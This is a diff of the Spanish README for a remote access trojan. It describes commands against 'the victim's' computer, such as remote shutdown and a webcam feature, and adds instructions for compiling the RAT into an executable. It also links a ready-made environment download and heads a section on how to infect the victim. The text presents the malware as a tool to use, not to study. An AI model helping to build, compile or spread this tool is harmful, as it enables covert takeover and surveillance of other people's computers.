@@ -54,8 +54,6 @@ __Librerías utilizadas__
 * __import__ `socket`
 * __import__ `select`
 
-
-
 # Funcionalidades
 ## /apagar
 `Apaga la computadora de la victima`
@@ -196,16 +194,29 @@ __Ejemplo:__
 __NOTA:__`  No probado, tampoco sé si la luz de la webCam se enciende.`
 ___
 ___
-# instalación:
+
+## Futuras caracteristicas
+Se está trabajando en las siguientes caracteristicas
+![dsf](https://i.imgur.com/CnA3G20.png)
+
+# Preparación
 
 __Nota:__ Si usted desea puede descargar el entorno virtual de python 3.7 con todas las librerías instaladas y usadas en éste proyecto [_aquí_](https://jxjjxy-my.sharepoint.com/:f:/g/personal/ztjr_7ee_t_odmail_cn/EmlA_2f55ZxPoJh8yPMkvD4BrUNI0rJfjaPBrZP-84sCQw?e=kHqqgE)
 
+* 
+
+
 ## Conversión de `*.py a *.exe`:
+* Busque el archivo `Compilar.bat`
+![Compilar.bat](https://i.imgur.com/bM9qBQg.png)
+* => Clic derecho => Editar 
+![Compilar.bat código](https://i.imgur.com/upyuCW8.png)
+Y colocamos la ruta de la carpeta donde se encuentra el RAT
+* => Guardamos => Ejecutamos para compilar...
+![](https://i.imgur.com/fj0Bzri.png)
+* Listo, el RAT se compiló exitosamente.
 
-
-
-
-## Método de infección:
+# Método de infección:
 ___¿Cómo infecto a la victima?___
 
 ![Final files](https://i.imgur.com/lGjXUlC.png)
